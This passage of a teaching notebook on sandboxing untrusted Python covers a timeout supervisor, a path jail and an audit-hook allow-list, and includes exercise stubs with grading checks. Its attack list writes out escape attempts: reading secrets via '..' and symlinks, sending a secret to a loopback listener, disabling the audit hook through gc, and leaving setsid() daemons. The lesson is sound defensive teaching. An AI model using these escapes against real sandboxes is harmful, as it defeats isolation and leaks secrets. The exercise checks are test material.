that stops everything is easy to build; the benign suite is what keeps it honest, and every
table below reports both.

Each attempt is first run against the **undefended child**. That is the positive control. An
attempt that does not reach its goal there (a typo, a platform difference) proves nothing about
any layer, so it must never be counted as "stopped". Read the attempts in the cell below; they
are given, and they are all ordinary Python.

In [ ]:
class Attempt(NamedTuple):
    id: int
    name: str
    group: str
    goal: str       # which canary decides whether it worked (GOAL_TEXT)
    source: str     # Python text; @NAMES@ are filled from the arena (World.fill)


GOAL_TEXT = {
    "token": "the planted secret appears in the program's output",
    "name": "the name of a file outside the jail appears in the output",
    "size": "the size of a file outside the jail appears in the output",
    "env": "the secret planted in the environment appears in the output",
    "out": "a file appears outside the jail",
    "net": "the listener on the loopback receives the secret",
    "survive": "a process the run started is still working after the run has ended",
    "hang": "nothing but the harness (its backstop or the child's dead-man's alarm) ends the run",
    "fill": "the jail holds a large file",
}


def _src(text: str) -> str:
    return textwrap.dedent(text).strip() + "\n"


ATTACKS = [
    Attempt(1, "read an absolute path", "files", "token", _src(r"""
        print(open("@SECRET@").read())""")),
    Attempt(2, "read through ..", "files", "token", _src(r"""
        print(open("../@SECRETNAME@").read())""")),
    Attempt(3, "read a folder named like the jail", "files", "token", _src(r"""
        print(open("@SIBLING@").read())""")),
    Attempt(4, "read through a relative symlink", "files", "token", _src(r"""
        import os
        os.mkdir("sub")
        os.chdir("sub")
        os.symlink("..", "../up")
        print(open("../up/@SECRETNAME@").read())""")),
    Attempt(5, "read through a hard link", "files", "token", _src(r"""
        import os
        os.link("@SECRET@", "copy.txt")
        print(open("copy.txt").read())""")),
    Attempt(6, "write to an absolute path", "files", "out", _src(r"""
        open("@OUT@", "w").write("@TOKEN@")""")),
    Attempt(7, "rename a file out", "files", "out", _src(r"""
        import os
        open("tmp.txt", "w").write("@TOKEN@")
        os.rename("tmp.txt", "@OUT@")""")),
    Attempt(8, "list the parent folder", "files", "name", _src(r"""
        import os
        print(sorted(os.listdir("..")))""")),
    Attempt(9, "ask the size of a file outside", "files", "size", _src(r"""
        import os
        print("size", os.stat("@SECRET@").st_size)""")),
    Attempt(10, "start a program with subprocess", "processes", "out", _src(r"""
        import subprocess, sys
        subprocess.run([sys.executable, "-I", "-S", "-c", "open('@OUT@', 'w').write('@TOKEN@')"])""")),
    Attempt(11, "start a program with os.system", "processes", "out", _src(r"""
        import os, sys
        os.system('"%s" -I -S -c "open(%r, %r).write(%r)"' % (sys.executable, "@OUT@", "w", "@TOKEN@"))""")),
    Attempt(12, "fork and exec", "processes", "out", _src(r"""
        import os, sys
        pid = os.fork()
        if pid == 0:
            try:
                os.execv(sys.executable, [sys.executable, "-I", "-S", "-c", "open('@OUT@', 'w').write('@TOKEN@')"])
            finally:
                os._exit(0)
        os.waitpid(pid, 0)""")),
    Attempt(13, "import a module by a computed name", "processes", "out", _src(r"""
        import sys
        module = __import__("".join(["sub", "pro", "cess"]))
        module.run([sys.executable, "-I", "-S", "-c", "open('@OUT@', 'w').write('@TOKEN@')"])""")),
    Attempt(14, "leave a daemon running", "processes", "survive", _src(r"""
        import os, sys, time
        code = ("import signal, time\n"
                "signal.alarm(20)\n"
                "while True:\n"
                "    open('@HEART@', 'a').write('x')\n"
                "    time.sleep(0.02)\n")
        quiet = [(os.POSIX_SPAWN_OPEN, 0, os.devnull, os.O_RDONLY, 0),
                 (os.POSIX_SPAWN_OPEN, 1, os.devnull, os.O_WRONLY, 0),
                 (os.POSIX_SPAWN_OPEN, 2, os.devnull, os.O_WRONLY, 0)]
        os.posix_spawn(sys.executable, [sys.executable, "-I", "-S", "-c", code], {}, file_actions=quiet)
        for _ in range(500):                       # leave only once the daemon has shown it is alive
            if os.path.exists("@HEART@"):
                break
            time.sleep(0.02)""")),
    Attempt(15, "connect out and send the secret", "network", "net", _src(r"""
        import socket
        conn = socket.create_connection(("127.0.0.1", @PORT@))
        conn.sendall(b"@TOKEN@")
        conn.close()""")),
    Attempt(16, "read the environment", "secrets", "env", _src(r"""
        import os
        print(os.environ.get("@ENV@"))""")),
    Attempt(17, "switch the hook off through gc", "the hook", "token", _src(r"""
        import gc
        for obj in gc.get_objects():
            if getattr(obj, "__name__", "") == "hook":
                obj.__code__ = (lambda *args: None).__code__
        print(open("@SECRET@").read())""")),
    Attempt(18, "switch the policy off through its module", "the hook", "token", _src(r"""
        import sys
        try:
            state = sys.modules["__main__"].policy
            state["events"] = None
            state["jail"] = None
        except Exception:
            pass
        print(open("@SECRET@").read())""")),
    Attempt(19, "loop for ever", "resources", "hang", _src(r"""
        while True:
            pass""")),
    Attempt(20, "fill the disk", "resources", "fill", _src(r"""
        with open("fill.bin", "wb") as f:
            f.write(bytes(@FILL@))""")),
    Attempt(21, "leave a daemon in a session of its own", "processes", "survive", _src(r"""
        import os, sys, time
        code = ("import os, signal, time\n"
                "os.setsid()\n"
                "signal.alarm(5)\n"
                "while True:\n"
                "    open('@HEART@', 'a').write('x')\n"
                "    time.sleep(0.02)\n")
        quiet = [(os.POSIX_SPAWN_OPEN, 0, os.devnull, os.O_RDONLY, 0),
                 (os.POSIX_SPAWN_OPEN, 1, os.devnull, os.O_WRONLY, 0),
                 (os.POSIX_SPAWN_OPEN, 2, os.devnull, os.O_WRONLY, 0)]
        os.posix_spawn(sys.executable, [sys.executable, "-I", "-S", "-c", code], {}, file_actions=quiet)
        for _ in range(500):                       # leave only once the daemon has shown it is alive
            if os.path.exists("@HEART@"):
                break
            time.sleep(0.02)""")),
]
assert [a.id for a in ATTACKS] == list(range(1, 22))     # the prose says twenty-one

BENIGN = {
    "statistics": _src(r"""
        import statistics, math, json
        data = [3, 1, 4, 1, 5, 9, 2, 6]
        print(round(statistics.mean(data), 3), round(statistics.stdev(data), 3), round(math.sqrt(sum(data)), 3))
        print(json.dumps({"n": len(data), "max": max(data)}, sort_keys=True))"""),
    "word counts": _src(r"""
        import re, collections, string
        text = "the cat sat on the mat the end"
        counts = collections.Counter(re.findall(r"[a-z]+", text))
        print(sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))[:3], string.ascii_lowercase[:5])"""),
    "seeded simulation": _src(r"""
        import random, itertools, functools
        rng = random.Random(7)
        rolls = [rng.randint(1, 6) for _ in range(20)]
        print(sum(rolls), functools.reduce(lambda a, b: a * b, itertools.islice(rolls, 3)))"""),
    "file round trip": _src(r"""
        import os
        with open("data.csv", "w") as f:
            f.write("a,b\n1,2\n3,4\n")
        with open("data.csv") as f:
            rows = [line.strip().split(",") for line in f]
        print(rows, sorted(os.listdir(".")))
        os.remove("data.csv")"""),
    "work folder": _src(r"""
        import os
        os.mkdir("out")
        with open("out/a.txt", "w") as f:
            f.write("hello")
        os.rename("out/a.txt", "out/b.txt")
        print(sorted(os.listdir("out")))
        os.remove("out/b.txt")
        os.rmdir("out")"""),
    "records": _src(r"""
        import collections, datetime, textwrap
        Row = collections.namedtuple("Row", "day total")
        rows = [Row(datetime.date(2026, 1, 1) + datetime.timedelta(days=i), i * i) for i in range(3)]
        print(rows[-1], textwrap.shorten("alpha beta gamma delta", width=12))"""),
    "own module": _src(r"""
        import os, sys
        with open("helper.py", "w") as f:
            f.write("def double(x):\n    return 2 * x\n")
        sys.path.insert(0, os.getcwd())
        import helper
        print(helper.double(21))"""),
}

# Which audited events carry file paths, and at which positions of their argument tuple. The
# policy applies the jail check to exactly these. The table is given, and it is a policy choice: it
# covers the common file and folder operations, not all of them (os.chown and shutil.copytree are
# audited events that are not here, so the jail half never judges them), and it leaves the creation
# of processes to the allow-list. A relative path is judged from the current folder; a new link's
# target is read later from the link's own folder, so a link can be made that leads out, and what has
# to stop it is the open that goes through it (attempt 4).
PATH_ARGS = {"open": (0,), "os.listdir": (0,), "os.scandir": (0,), "os.walk": (0,), "os.mkdir": (0,),
             "os.remove": (0,), "os.rmdir": (0,), "os.rename": (0, 1), "os.link": (0, 1),
             "os.symlink": (0, 1), "os.chdir": (0,), "os.chmod": (0,), "os.truncate": (0,),
             "os.utime": (0,), "shutil.copyfile": (0, 1), "shutil.rmtree": (0,)}

_ALLOWED: set[str] = set()      # the events the benign suite raised; filled by learn_allow_list()


def make_policy(layers: frozenset, world: World) -> dict | None:
    """The policy dictionary the child receives. None means "install no hook at all"."""
    if "audit" not in layers and "jail" not in layers:
        return None
    return {"events": sorted(allowed_events()) if "audit" in layers else None,
            "modules": list(PRELOAD) + list(OWN_MODULES),
            "jail": world.jail if "jail" in layers else None,
            "path_args": {event: list(spots) for event, spots in PATH_ARGS.items()}}


def execute(source: str, layers: frozenset, world: World, *, hardened: bool = False) -> Run:
    """Run `source` in `world` behind `layers` and return the supervisor's report.

    audit: the policy functions are shipped and the hook enforces them. jail: the policy gets the
    jail folder, and the child's environment is empty (otherwise it holds the planted secret).
    timeout: YOUR supervisor with TIMEOUT_S; without it, the naive one with the longer backstop.
    """
    env = {} if "jail" in layers else {"PATH": "/usr/bin:/bin", world.env_name: world.token}
    policy = make_policy(layers, world)
    shipped = {"inside_jail": inside_jail, "event_verdict": event_verdict} if policy else None
    proc = launch(source, policy, world.jail, env, functions=shipped, hardened=hardened)
    if "timeout" in layers:
        return supervise(proc, TIMEOUT_S)
    return supervise_naive(proc, BACKSTOP_S)


def _size(path: str) -> int:
    return os.path.getsize(path) if os.path.exists(path) else 0


def still_beating(path: str) -> bool:
    """Is something still adding to the heartbeat file at `path`? A live process adds to it every
    few hundredths of a second; a stopped one cannot."""
    time.sleep(0.1)                      # a process that was just signalled needs a moment to die
    before = _size(path)
    time.sleep(0.35)
    return _size(path) > before


def survived(world: World) -> bool:
    """Did a process the run started keep working after the run had ended?"""
    return still_beating(world.heart)


def reached(goal: str, run: Run, world: World, layers: frozenset) -> bool:
    """Did the attempt reach its goal? Decided by canaries, never by what the program said."""
    if goal in ("token", "env"):
        return world.token in run.stdout
    if goal == "name":
        return world.secret_name in run.stdout
    if goal == "size":
        return f"size {len(world.token)}" in run.stdout
    if goal == "out":
        return os.path.exists(world.out)
    if goal == "net":
        return world.token.encode() in world.received()
    if goal == "survive":
        return survived(world)
    if goal == "hang":     # nothing but the harness ended the run: its backstop, or the child's dead-man's alarm
        return run.returncode == -signal.SIGALRM or (run.status == "timeout" and "timeout" not in layers)
    if goal == "fill":
        return world.jail_bytes() >= FILL_COUNTS
    raise ValueError(goal)


def run_attempt(attempt: Attempt, layers: frozenset, *, hardened: bool = False, keep: dict | None = None) -> bool:
    """Did `attempt` reach its goal against `layers`? A fresh arena every time. `keep`, if given, receives
    the supervisor's report under "run"."""
    world = World(attempt.id)
    try:
        if attempt.goal == "net":
            world.listen()
        run = execute(world.fill(attempt.source), layers, world, hardened=hardened)
        if keep is not None:
            keep["run"] = run
        return reached(attempt.goal, run, world, layers)
    finally:
        reap_all()
        world.close()


assert len(BENIGN) == 7                                    # the prose says seven
_BENIGN_EXPECTED: dict[str, str] = {}


def run_benign(name: str, layers: frozenset) -> bool:
    """Did the benign program `name` still run to the same output behind `layers`?"""
    if not _BENIGN_EXPECTED:
        for key, source in BENIGN.items():
            world = World(0)
            try:
                _BENIGN_EXPECTED[key] = execute(source, frozenset(), world).stdout
            finally:
                reap_all()
                world.close()
    world = World(0)
    try:
        run = execute(BENIGN[name], layers, world)
        return run.returncode == 0 and run.stdout == _BENIGN_EXPECTED[name]
    finally:
        reap_all()
        world.close()

In [ ]:
# The control. Every attempt, against the undefended child (no layer at all).
def control_run() -> dict[int, bool]:
    print(f"{'#':>2}  {'group':<10} {'attempt':<40} goal reached with no defence")
    worked = {}
    for attempt in ATTACKS:
        worked[attempt.id] = run_attempt(attempt, frozenset())
        print(f"{attempt.id:>2}  {attempt.group:<10} {attempt.name:<40} {'yes' if worked[attempt.id] else 'NO'}")
    works = sum(worked.values())
    print("\nwhat reaching the goal means, by goal:")
    for goal in dict.fromkeys(a.goal for a in ATTACKS):
        print(f"  {goal:<8} {GOAL_TEXT[goal]}")
    print(f"\n{works} of {len(ATTACKS)} attempts reach their goal against the undefended child.")
    if works < len(ATTACKS):
        print("The others cannot count as stopped by anything: they never worked. Fix the attempt first.")
    ok = sum(run_benign(name, frozenset()) for name in BENIGN)
    print(f"{ok} of {len(BENIGN)} benign programs run and print what they print when nothing watches them.")
    return worked


CONTROL: dict[int, bool] = {}
if _DEMOS:
    CONTROL = control_run()

## 3. Layer T — Exercise 1: `supervise()`

Three attempts are about time and the process table, not files: one never stops (19), and two leave a
process running after the run (14 in the run's process group, 21 outside it). The naive supervisor above
ends only the first, and only because the harness gave it a backstop.

* the child was started in its **own session**, so its pid is also the id of a **process group**, and
  every process the child starts stays in that group until it leaves it;
* `proc.kill()` signals the child only; a grandchild keeps running, and if it holds the child's
  pipes, `communicate()` goes on waiting for it;
* `os.killpg(group_id, signal.SIGKILL)` signals every process in the group, and `SIGKILL` cannot be
  caught, blocked or ignored. But a process **can** leave the group: `setsid()` puts it in a group of
  its own, out of reach of that signal (attempt 21 does exactly this);
* `Popen.communicate(timeout=...)` does not kill anything when the time is up. As of 15 October 2026
  Python's documentation says so: stopping the child and finishing the conversation is your job.

**What `supervise(proc, timeout_s)` must do.** `proc` is a `subprocess.Popen` that was started
with `start_new_session=True` and with pipes for output.

1. Wait up to `timeout_s` seconds for it to finish, reading its output as it comes (a full pipe blocks the child).
2. The status says what became of the **child**: `"exited"` if it ended by itself, `"timeout"` if it was
   still running when the time was up and you had to stop it. Once the time is up, stop *everything
   still in the child's group* with `SIGKILL`, then collect the output that is left, waiting at most
   `GRACE_S` seconds. A process outside the group can still hold the child's pipes, even when the child
   is long gone: when `GRACE_S` is up, stop waiting and return what you have (closing the pipes is good form).
3. Either way, before returning, signal the group once more: a child can exit and leave a daemon
   behind. Make sure the child has been waited for, so that its return code is set.
4. Return `Run(status, stdout, stderr, returncode)`, the output decoded as UTF-8 with bad bytes replaced.

Signal `proc.pid` and no other group: `os.getpgrp()` and `0` name *your* group, which holds this
notebook. An empty group raises `ProcessLookupError`; as observed while this lesson was written,
macOS raises `PermissionError` when only an exited child is left. Ignore both, on every call.

<details><summary>💡 Hint 1 — what to think about</summary>

Which processes does "stop the child" reach, and which are left? Which single number names the group
they share? When must the clean-up happen: only when time ran out, or also when the child finished by
itself? When time runs out, how do you tell a child still running from one that has ended? What if
something that cannot be signalled is holding the pipes?
</details>
<details><summary>💡 Hint 2 — the approach, in words</summary>

Wait with `communicate` and a timeout. If it raises `TimeoutExpired`, ask the child whether it has ended
(`poll()`): that decides the status. Send `SIGKILL` to the group named by the child's pid (ignoring the
errors that mean it is empty), then call `communicate` again with a timeout of `GRACE_S`. If that raises
`TimeoutExpired` too, the exception carries what was read so far: keep it, stop reading and wait for the
child. After that, whichever way it went, signal the group once more. Build the `Run` last.
</details>

In [ ]:
def supervise(proc: subprocess.Popen, timeout_s: float) -> Run:
    """Run `proc` to completion under a wall-clock limit and leave nothing of it behind.

    `proc` was started with `start_new_session=True` and `stdout`/`stderr` pipes, so `proc.pid` is
    its process group's id too. Returns `Run(status, stdout, stderr, returncode)`. A process that
    left the group (it called `setsid()`) cannot be reached through it: do not wait for it for ever.

    Example:
        >>> proc = subprocess.Popen([sys.executable, "-c", "print('hi')"], stdout=subprocess.PIPE,
        ...                         stderr=subprocess.PIPE, start_new_session=True)
        >>> supervise(proc, 5)
        Run(status='exited', stdout='hi\\n', stderr='', returncode=0)
        (a child that sleeps for a minute comes back as status='timeout' with returncode=-9, and
        any program it had started in its group is gone too)

    Returns:
        a Run; `status` is "exited" when the child ended by itself and "timeout" when it was still
        running at the limit and had to be stopped.
    """
    # YOUR CODE HERE
    raise NotImplementedError


# Public checks — run these as often as you like.
def _kid(code: str) -> subprocess.Popen:
    """A tiny child for the checks: its own session, pipes for output, no input. It ends itself
    after a while, so that a wrong answer cannot leave it running. Returns once the child's
    interpreter is running, so that a slow start-up does not count against a limit."""
    ready_r, ready_w = os.pipe()
    start = f"import os, signal; signal.alarm(30); os.write({ready_w}, b'R'); os.close({ready_w})\n"
    proc = subprocess.Popen([sys.executable, "-I", "-S", "-c", start + code], stdin=subprocess.DEVNULL,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, pass_fds=(ready_w,),
                            start_new_session=True)
    os.close(ready_w)
    _LIVE[proc.pid] = proc
    if select.select([ready_r], [], [], 30)[0]:
        os.read(ready_r, 1)
    os.close(ready_r)
    return proc


def _daemon_code(beat: str, alive: int = 6) -> str:
    """A helper that writes to `beat` every few hundredths of a second and ends itself after `alive` seconds."""
    return textwrap.dedent(f'''
        import signal, time
        signal.alarm({alive})
        while True:
            open({beat!r}, "a").write("x")
            time.sleep(0.02)
    ''')


def _spawner(beat: str, then: str, inherit_pipes: bool = False, new_session: bool = False) -> str:
    """Source for a child that starts a helper beating into `beat`, and then runs `then`. The helper
    holds the child's output pipes when `inherit_pipes`, and leaves the child's process group when
    `new_session`."""
    extra = "" if inherit_pipes else ", stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL"
    extra += ", start_new_session=True" if new_session else ""
    alive = 8 if new_session else 6
    return textwrap.dedent(f'''
        import subprocess, sys, time
        subprocess.Popen([sys.executable, "-I", "-S", "-c", {_daemon_code(beat, alive)!r}]{extra})
        {then}
    ''')


def _check_supervise() -> None:
    try:
        run = supervise(_kid("print('hello')"), 10)
        assert (run.status, run.stdout, run.returncode) == ("exited", "hello\n", 0), (
            f"got {(run.status, run.stdout, run.returncode)}: a child that finishes in time has "
            "status 'exited', its output as text and its own exit code"
        )
        run = supervise(_kid("import sys; sys.stderr.write('oops'); sys.exit(3)"), 10)
        assert (run.returncode, run.stderr) == (3, "oops"), (
            f"got {(run.returncode, run.stderr)}: return the child's own exit code and what it wrote to stderr"
        )
        run = supervise(_kid("import sys; sys.stdout.write('x' * 1200000)"), 5)
        assert (run.status, len(run.stdout), run.returncode) == ("exited", 1200000, 0), (
            f"got {(run.status, len(run.stdout), run.returncode)} for a child that writes 1.2 million characters and "
            "exits at once: read its output while you wait (communicate does), instead of waiting for it to end "
            "first; a child that has filled a pipe cannot end until somebody reads"
        )
        run = supervise(_kid("import time; print('partial', flush=True); time.sleep(60)"), 0.5)
        assert run.status == "timeout", (
            f"got status {run.status!r} for a child that sleeps for a minute under a 0.5 s limit; "
            "the status is 'timeout' when you had to stop it"
        )
        assert run.returncode == -signal.SIGKILL, (
            f"got return code {run.returncode}; a child stopped with SIGKILL reports minus the signal number"
        )
        assert "partial" in run.stdout, (
            "output the child printed before the timeout must still be returned: call communicate() "
            "again after the kill, instead of discarding what it had written"
        )
        kid = _kid("import time; time.sleep(60)")
        started = time.monotonic()
        run = supervise(kid, 1.5)
        took = time.monotonic() - started
        assert 1.3 <= took < 2.5, (
            f"supervise() returned after {took:.1f} s for a child that never finishes under a 1.5 s limit: wait for the "
            "limit you are given, neither shorter nor longer, then stop the child"
        )
        scratch = tempfile.mkdtemp(prefix="supervise-check-")
        try:
            beat = os.path.join(scratch, "beat.txt")
            supervise(_kid(_spawner(beat, "time.sleep(60)")), 0.6)
            assert not still_beating(beat), (
                "a process the child started is still running after the timeout: proc.kill() stops "
                "the child only; signal the whole process group with os.killpg(proc.pid, ...)"
            )
            beat = os.path.join(scratch, "beat2.txt")
            run = supervise(_kid(_spawner(beat, "pass")), 10)
            assert run.status == "exited", (
                f"got status {run.status!r} for a child that exited by itself: a child that ended in time is 'exited'"
            )
            assert not still_beating(beat), (
                "the child exited by itself but left a process running: the group has to be cleaned "
                "up on every path out of supervise(), not only after a timeout"
            )
            beat = os.path.join(scratch, "beat3.txt")
            started = time.monotonic()
            run = supervise(_kid(_spawner(beat, "time.sleep(60)", inherit_pipes=True)), 0.6)
            assert time.monotonic() - started < 5, (
                "supervise() waited for a program the child started, because it still held the "
                "child's pipes open: kill the whole group first, and only then call communicate()"
            )
            assert not still_beating(beat), "a process that held the pipes open is still running"
            for then, name, status in (("time.sleep(60)", "beat4.txt", "timeout"),
                                       ("print('gone', flush=True)", "beat5.txt", "exited")):
                kid = _kid(_spawner(os.path.join(scratch, name), then, inherit_pipes=True, new_session=True))
                started = time.monotonic()
                try:
                    run = supervise(kid, 0.6)
                except PermissionError:
                    raise AssertionError(
                        "os.killpg raised PermissionError, which macOS does for a group whose only member is a child "
                        "that has already exited: ignore it as you ignore ProcessLookupError, on every call"
                    ) from None
                took = time.monotonic() - started
                assert took < 0.6 + GRACE_S + 2, (
                    f"supervise() took {took:.1f} s because a helper in a session of its own, which killpg cannot "
                    "reach, still held the child's pipes. After the kill call communicate() with a timeout of "
                    "GRACE_S; if that raises TimeoutExpired, close the pipes and go on with what you have"
                )
                assert run.status == status, (
                    f"got status {run.status!r}, expected {status!r}: the status describes the child. 'timeout' means it "
                    "was still running when the time was up; 'exited' means it had ended by itself, even though a "
                    "helper it started still holds its pipes"
                )
                assert isinstance(run.returncode, int), (
                    f"got return code {run.returncode!r}: after you stop reading, wait for the child so that its "
                    "return code is set"
                )
        finally:
            _remove_tree(scratch)
    finally:
        reap_all()
    print("exercise 1 looks right")


_try("exercise 1", _check_supervise)

In [ ]:
# What the timeout layer buys, measured: the attempts that a supervisor can end, and one it cannot.
def _demo_timeout_layer() -> None:
    still = []
    for number in (14, 19, 21):
        attempt = ATTACKS[number - 1]
        bare = CONTROL[number] if number in CONTROL else run_attempt(attempt, frozenset())
        behind = run_attempt(attempt, frozenset({"timeout"}))
        if bare and behind:
            still.append(number)
        print(f"{number:>2} {attempt.name:<40} nothing: {'reaches its goal' if bare else 'fails'}"
              f" · timeout layer ({TIMEOUT_S} s): {'reaches its goal' if behind else 'stopped'}")
    if still:
        print(f"\nBehind the timeout layer, attempt{'s' if len(still) > 1 else ''} {', '.join(map(str, still))} still "
              f"reach{'' if len(still) > 1 else 'es'} the goal. A signal sent to the child's process group reaches the "
              "processes that are in it when it is sent; a process that called setsid() before that is not.")


if _DEMOS:
    _try("timeout layer", _demo_timeout_layer, needs=("exercise 1",))

## 4. Layer J — Exercise 2: `inside_jail()`

The jail is a folder. A file event is allowed when the path it names leads somewhere inside that
folder, and the question sounds like a string test. It is not one, for three reasons:

* **`..`**: `jail/../secret.txt` starts with the jail's name and leaves it;
* **symlinks**: a link inside the jail can point anywhere, so a path that is "inside" by its
  spelling can lead out. The child can make such a link itself, naming its target relative to the
  link's own folder (attempt 4), and then open a path that runs through it;
* **look-alike names**: `jail-sibling` starts with the characters of `jail`.

The last cell of this section builds a small tree with each of these in it, once your function
passes its check, and puts it beside the two checks people write first: the raw prefix test, and
the prefix test after tidying the path with `os.path.abspath`. The `truth` column is how the
tree was built, not something computed.

**What `inside_jail(path, root)` must do.** Return `True` when the *real* location of `path` is
`root` itself or somewhere inside it, and `False` otherwise.

* Resolve **both** sides to real locations (symlinks followed, `..` applied). The root can be
  reached through a link too: on macOS the temporary folder is.
* Compare whole path components, not characters, and compare the resolved paths exactly, case
  included: on a case-sensitive file system `Jail` and `jail` are different folders, and a
  policy must not guess. The root may be any folder, `/` included.
* A path that does not exist yet is judged by where it *would* be: a file about to be created
  inside the jail is inside.
* A relative `path` is relative to the current working directory, as for the operating system.
* `path` may be `str`, `bytes` or any path-like object; `root` is a `str`.

<details><summary>💡 Hint 1 — what to think about</summary>

Two different spellings can name the same place, and two similar spellings can name different
places. Ask the operating system where each one really is rather than reasoning about the text,
and compare the two answers in a way that cannot confuse a name with a longer name that begins
the same way.
</details>
<details><summary>💡 Hint 2 — the approach, in words</summary>

Turn both the path and the root into their real, resolved locations (the standard library has a
function that does that for paths that need not exist). Then the path is inside when it is the
root, or when the root followed by a path separator begins it (mind a root that already ends in
one). Convert a bytes or path-like argument to text first.
</details>

In [ ]:
def _jail_tree():
    """A tree with every trap in it. Returns (top folder, jail folder, [(label, path, truth, hint)]);
    the hint names the mistake that gets that row wrong."""
    top = tempfile.mkdtemp(prefix="jail-tree-")
    jail = os.path.join(top, "jail")
    for folder in (jail, os.path.join(jail, "sub"), os.path.join(top, "jail-sibling"), os.path.join(top, "outside")):
        os.mkdir(folder)
    for name in (os.path.join(jail, "notes.txt"), os.path.join(top, "jail-sibling", "notes.txt"),
                 os.path.join(top, "outside", "secret.txt")):
        with open(name, "w") as f:
            f.write("x")
    os.symlink(os.path.join(top, "outside"), os.path.join(jail, "out_link"))
    os.symlink(os.path.join(jail, "sub"), os.path.join(jail, "in_link"))
    os.symlink(jail, os.path.join(top, "alias"))
    inside = ("A path that is inside must be accepted: the jail itself, a file that does not exist yet, "
              "a `..` that stays inside, a link that points inside, a root reached through a link.")
    rows = [
        ("the jail folder itself", jail, True, inside),
        ("a file in the jail", os.path.join(jail, "notes.txt"), True, inside),
        ("a file about to be created inside", os.path.join(jail, "sub", "new.txt"), True,
         inside + " A path need not exist yet: judge where it would be."),
        ("down and back up with ..", os.path.join(jail, "sub", "..", "notes.txt"), True, inside),
        ("through a link that points inside", os.path.join(jail, "in_link"), True, inside),
        ("the jail reached through another link", os.path.join(top, "alias", "notes.txt"), True,
         inside + " Resolve the root as well as the path."),
        ("a folder named like the jail", os.path.join(top, "jail-sibling", "notes.txt"), False,
         "jail-sibling begins with the characters of jail but is another folder: compare whole path components."),
        ("out through ..", os.path.join(jail, "..", "outside", "secret.txt"), False,
         "the `..` leaves the jail: apply it before comparing."),
        ("through a link that points outside", os.path.join(jail, "out_link", "secret.txt"), False,
         "a link inside the jail can lead out of it: resolve symlinks before comparing."),
        ("the folder above the jail", top, False, "the parent folder is not inside the jail."),
    ]
    return top, jail, rows


def naive_prefix(path, root) -> bool:
    """First draft: the text of the path starts with the text of the root."""
    return str(path).startswith(root)


def naive_abspath(path, root) -> bool:
    """Second draft: tidy the path (apply `..`) and then the same prefix test."""
    return os.path.abspath(str(path)).startswith(root)


def inside_jail(path, root: str) -> bool:
    """True when the real location of `path` is `root` itself or somewhere inside `root`.

    Both are resolved to real locations first (symlinks followed, `..` applied); `path` need not
    exist; a relative `path` is relative to the current directory; `path` may be str, bytes or
    path-like.

    Example:
        >>> inside_jail("/tmp/jail/notes.txt", "/tmp/jail")
        True
        >>> inside_jail("/tmp/jail-sibling/notes.txt", "/tmp/jail")
        False
        (so is "/tmp/jail/../x", and so is anything that goes through a link that points out)

    Returns:
        a bool.
    """
    # YOUR CODE HERE
    raise NotImplementedError


# Public checks — run these as often as you like.
def _check_inside_jail() -> None:
    top, jail, rows = _jail_tree()
    try:
        for label, path, truth, hint in rows:
            got = inside_jail(path, jail)
            assert got is truth, f"{label}: expected {truth}, got {got!r}. {hint}"
        assert inside_jail(os.path.join(jail, "notes.txt").encode(), jail) is True, (
            "a bytes path must work: convert it to text first (os.fsdecode)"
        )
        assert inside_jail(os.path.join(jail, "notes.txt") + os.sep, jail + os.sep) is True, (
            "a trailing separator on the root or the path changes nothing"
        )
        assert inside_jail(jail, "/") is True, "every path is inside the root of the file system, which ends in a separator already"
        here = os.getcwd()
        try:
            os.chdir(jail)
            assert inside_jail("notes.txt", jail) is True, "a relative path is relative to the current directory"
            os.chdir(top)
            assert inside_jail("notes.txt", jail) is False, (
                "a relative path is relative to the current directory, not to the root: from the folder "
                "above the jail, 'notes.txt' is not in the jail"
            )
        finally:
            os.chdir(here)
    finally:
        shutil.rmtree(top, ignore_errors=True)
    print("exercise 2 looks right")


_try("exercise 2", _check_inside_jail)

In [ ]:
# The traps, side by side. `truth` is how the tree was built.
def _demo_jail_table() -> None:
    top, jail, rows = _jail_tree()
    try:
        print(f"{'path':<40} {'truth':<6} {'startswith':<11} {'abspath':<8} yours")
        for label, path, truth, _ in rows:
            print(f"{label:<40} {str(truth):<6} {str(naive_prefix(path, jail)):<11} "
                  f"{str(naive_abspath(path, jail)):<8} {inside_jail(path, jail)}")
        wrong = {name: sum(fn(path, jail) is not truth for _, path, truth, _ in rows)
                 for name, fn in (("startswith", naive_prefix), ("abspath", naive_abspath), ("yours", inside_jail))}
        print("\nrows each check gets wrong:", wrong)
    finally:
        shutil.rmtree(top, ignore_errors=True)


if _DEMOS:
    _try("jail table", _demo_jail_table, needs=("exercise 2",))

## 5. Layer A — Exercise 3: `event_verdict()`

Python raises an **audited event** for many of the operations that touch the outside world:
`open` (arguments: path, mode, flags), `os.system` (the command), `os.listdir` (a path),
`import` (a module name), `socket.connect`, and many others. Not for all of them: you will meet
attempts below that do things the hook is never told about. A function registered with
`sys.addaudithook` is called with the event's name and its arguments, and may raise an exception
to stop the operation. That is the whole mechanism, and it is what the bootstrap uses.

Where does the list of events a program may raise come from? Not from your head: the names differ
between Python versions. This lesson uses **learning mode**, the way a security profile for an
application is often drafted: run the benign suite under a hook that only *records*, and allow
exactly what it raised. The cell below does it and shows a few events.

That list has a flaw you can see in the table: the benign programs write files, so `open` is on
it, and an allow-list of *names* cannot tell opening a file in the jail from opening the planted
secret. Names are not enough. The policy therefore has two independent halves:

1. **the allow-list half** (when `policy["events"]` is a list): an event not on the list is
   refused, whatever its arguments. An `import` is also refused unless the **top-level package**
   of the module it names (the part before the first dot) is on `policy["modules"]`. That list
   holds the modules the bootstrap loads and `helper`, the module one benign program writes into
   its own folder and imports;
2. **the jail half** (when `policy["jail"]` is a folder): for an event in `policy["path_args"]`
   (a mapping from event name to the positions of its arguments that hold paths), every such
   argument that exists and is a `str`, `bytes` or path-like object must be inside the jail.
   Anything else in that position, such as the integer of an open file, is not a path.

A half whose switch is `None` is off. `event_verdict(event, args, policy)` returns `None` to
allow, or a short non-empty string saying why not (it becomes the error text the child sees).
Your function is shipped to the child on its own: it may use `os`, `sys`, `re`, `pathlib` and
your `inside_jail`, nothing else from this notebook, and it must not depend on default values.
Its check calls it here, and then ships it to a real child and runs the benign programs through it.

In [ ]:
def record_events(source: str) -> set[str]:
    """Run `source` in a child that only RECORDS audited events, and return their names."""
    world = World(0)
    try:
        proc = launch(source, None, world.jail, {}, record=True)
        run = supervise_naive(proc, BACKSTOP_S)
